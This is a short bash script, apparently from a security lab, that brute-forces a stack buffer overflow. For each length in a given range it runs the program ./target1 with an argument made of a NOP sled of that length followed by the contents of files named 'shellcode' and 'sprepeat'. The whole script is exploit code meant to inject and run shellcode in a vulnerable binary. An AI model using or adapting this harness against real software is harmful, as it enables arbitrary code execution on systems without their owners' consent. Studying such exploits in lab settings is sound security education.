#!/bin/bash
echo testing from $1 to $2...;
for (( i=$1; i<=$2; i++ ))
do
  echo $i; 
  ./target1 $(perl -e 'print "\x90"x$i'; cat shellcode sprepeat);
done
